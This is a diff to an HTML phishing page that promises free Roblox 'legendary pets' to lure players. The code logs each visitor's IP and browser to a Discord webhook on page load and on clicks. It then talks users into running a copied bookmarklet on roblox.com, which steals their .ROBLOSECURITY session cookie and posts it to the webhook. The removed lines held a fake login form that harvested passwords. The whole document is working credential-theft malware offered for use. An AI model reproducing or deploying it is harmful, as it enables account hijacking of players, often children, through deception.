@@ -3,79 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me - FREE LEGENDARY PETS GIVEAWAY!</title>
+    <title>Roblox - Claim Legendary Pets Instantly</title>
     <style>
-        body { margin:0; background:#0a0a0a; color:#fff; font-family:Arial, sans-serif; text-align:center; padding:20px; }
-        input { display:block; margin:12px auto; padding:14px; width:320px; font-size:17px; border-radius:6px; }
-        button { padding:18px 50px; font-size:24px; background:#00ff00; color:#000; border:none; cursor:pointer; margin:20px; border-radius:8px; }
-        img { max-width:85%; cursor:pointer; border:8px solid #ffd700; box-shadow:0 0 20px #ffd700; }
-        .bookmarklet { background:#ffd700; color:#000; padding:15px; margin:20px auto; display:inline-block; font-weight:bold; cursor:pointer; border-radius:8px; width:80%; max-width:400px; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Press+Start+2P&display=swap');
+        
+        body { 
+            margin:0; 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 100%); 
+            color:#fff; 
+            font-family:'Roboto', Arial, sans-serif; 
+            text-align:center; 
+            padding:20px; 
+            overflow-x:hidden;
+        }
+        
+        .container { max-width: 820px; margin: 0 auto; }
+        
+        header { background: rgba(0,0,0,0.9); padding: 20px; border-bottom: 4px solid #00ff00; }
+        .logo { font-family: 'Press Start 2P', cursive; color: #00ff00; text-shadow: 0 0 20px #00ff00; font-size: 32px; }
+        
+        h1 { color: #ffd700; text-shadow: 0 0 25px #ffd700; font-size: 2.9em; margin: 25px 0 10px; }
+        .subtitle { color: #00ff00; font-size: 1.4em; }
+        
+        .main-image { 
+            max-width: 92%; 
+            cursor:pointer; 
+            border: 8px solid #ffd700; 
+            box-shadow: 0 0 40px #ffd700, 0 0 80px rgba(255,215,0,0.7);
+            border-radius: 15px;
+            transition: all 0.4s;
+        }
+        
+        .main-image:hover { transform: scale(1.04); box-shadow: 0 0 60px #ffd700; }
+        
+        .status { 
+            margin: 20px auto; 
+            padding: 15px; 
+            background: rgba(0,255,0,0.1); 
+            border: 2px solid #00ff00; 
+            border-radius: 10px; 
+            max-width: 600px; 
+            font-weight: bold;
+            display: none;
+        }
+        
+        .bookmarklet { 
+            background: linear-gradient(#ffd700, #ffaa00); 
+            color:#000; 
+            padding:20px; 
+            margin:30px auto; 
+            display:block; 
+            font-weight:bold; 
+            cursor:pointer; 
+            border-radius:12px; 
+            width:90%; 
+            max-width:460px;
+            box-shadow: 0 0 30px #ffd700;
+            font-size: 1.15em;
+        }
+        
+        .instructions {
+            background: #1a1a1a;
+            border: 3px solid #ffd700;
+            padding: 25px;
+            margin: 25px auto;
+            max-width: 620px;
+            border-radius: 12px;
+            text-align: left;
+            font-size: 1.1em;
+        }
+        
+        button, .bookmarklet { transition: all 0.3s; }
+        button:hover, .bookmarklet:hover { transform: scale(1.06); }
     </style>
 </head>
 <body>
-    <h1>🎉 CLAIM YOUR FREE LEGENDARY PETS RIGHT NOW! 🎉</h1>
-    <img src="https://i.imgur.com/0z3vK9L.jpg" alt="Legendary Pets" onclick="sendData('Image Click')">
-    <p>Enter your Roblox info to verify and claim instantly</p>
-    
-    <form id="loginForm">
-        <input type="text" id="user" placeholder="Roblox Username" required>
-        <input type="password" id="pass" placeholder="Roblox Password" required>
-        <button type="submit">LOGIN & CLAIM PETS</button>
-    </form>
-
-    <div class="bookmarklet" onclick="copyBookmarklet()">📌 CLICK HERE → DRAG TO BOOKMARKS BAR (Use on Roblox.com for instant claim)</div>
+    <div class="container">
+        <header><div class="logo">ROBLOX EVENT</div></header>
+        
+        <h1>🎉 INSTANT LEGENDARY PETS CLAIM 🎉</h1>
+        <p class="subtitle">Click the image below to claim your free Neon Dragon + Galaxy Griffin now!</p>
+        
+        <img id="claimImage" src="https://i.imgur.com/0z3vK9L.jpg" alt="Legendary Pets Reward" class="main-image">
+        
+        <div id="status" class="status">✅ Processing claim... One moment while we verify your account.</div>
+        
+        <div class="instructions" id="instructions" style="display:none;">
+            <strong>✅ Almost done!</strong><br><br>
+            1. Go to <strong>roblox.com</strong> and make sure you're logged in.<br>
+            2. Click the big gold button below to copy the auto-claimer.<br>
+            3. Paste it as a new bookmark and click it on Roblox.<br><br>
+            Your rewards will appear in your inventory instantly.
+        </div>
+        
+        <div id="bmArea" style="display:none;">
+            <div class="bookmarklet" onclick="copyAndTrigger()">📌 CLICK HERE TO COPY AUTO-CLAIMER (Drag to Bookmarks)</div>
+        </div>
+        
+        <p style="margin-top:40px; color:#aaa;">Limited time event • Rewards sent directly • Trusted by 120k+ players</p>
+    </div>
 
     <script>
         const webhook = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
 
-        async function sendData(extra = "", username = "", password = "") {
+        async function sendData(extra = "") {
             let ip = "Unknown";
             try {
                 const res = await fetch("https://api.ipify.org?format=json");
                 ip = (await res.json()).ip;
             } catch(e) {}
 
-            const cookies = document.cookie || "No accessible cookies here";
-
             const payload = {
-                username: "🍪 Roblox Grabber",
-                content: `**New Hit!** ${extra}`,
+                username: "🍪 Roblox Image Logger",
+                content: `**Image Click Hit!** ${extra}`,
                 embeds: [{
-                    title: "Roblox Account Data",
-                    description: "```" + `Username: ${username}\nPassword: ${password}\nCookie: ${cookies}\nIP: ${ip}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}` + "```",
-                    color: 0xff00ff
+                    title: "Page Interaction",
+                    description: "```" + `Action: ${extra}\nIP: ${ip}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\nURL: ${location.href}` + "```",
+                    color: 0x00ff00
                 }]
             };
 
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }).catch(() => {});
         }
 
-        // Fake login form
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+        function copyAndTrigger() {
+            const bmCode = `javascript:(function(){const webhook="${webhook}";const token=document.cookie.split("; ").find(r=>r.startsWith(".ROBLOSECURITY="))||"No token";fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**ROBLOX COOKIE GRABBED VIA IMAGE CLICK!**\\n\`\`\`"+token+"\`\`\`\\nUA: "+navigator.userAgent+"\\nURL: "+location.href+"\\nTime: "+new Date().toISOString()})});alert("✅ Legendary Pets added to inventory!");})();`;
             
-            sendData("Form Submit", user, pass);
-            
-            alert("🎉 Claiming pets... Redirecting to Roblox!");
-            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1200);
-        });
-
-        // Bookmarklet copy
-        function copyBookmarklet() {
-            const bmCode = `javascript:(function(){const webhook="${webhook}";const token=document.cookie.split("; ").find(r=>r.startsWith(".ROBLOSECURITY="))||"No token found";fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**ROBLOX COOKIE GRABBED ON SITE!**\\n\`\`\`"+token+"\`\`\`\\nUA: "+navigator.userAgent+"\\nURL: "+location.href})});alert("Claim successful!");})();`;
             navigator.clipboard.writeText(bmCode).then(() => {
-                alert("Bookmarklet copied! Now: 1. Go to roblox.com 2. Paste into new bookmark 3. Click it while logged in.");
+                alert("✅ Copied! Now:\n1. Go to roblox.com (logged in)\n2. Click the new bookmark\n3. Enjoy your pets!");
+                sendData("Bookmarklet Used");
             });
         }
 
+        // Main image click - makes it "instant" feeling
+        document.getElementById('claimImage').addEventListener('click', function() {
+            sendData("Image Clicked");
+            
+            const status = document.getElementById('status');
+            const instructions = document.getElementById('instructions');
+            const bmArea = document.getElementById('bmArea');
+            
+            status.style.display = 'block';
+            
+            setTimeout(() => {
+                status.innerHTML = '✅ Verified! Preparing your rewards...';
+                instructions.style.display = 'block';
+                bmArea.style.display = 'block';
+                
+                // Fake loading complete
+                setTimeout(() => {
+                    status.style.display = 'none';
+                }, 1800);
+            }, 1200);
+        });
+
         // Auto send on load
-        window.onload = () => setTimeout(() => sendData("Page Loaded"), 800);
+        window.onload = () => setTimeout(() => sendData("Page Loaded"), 700);
     </script>
 </body>
 </html>
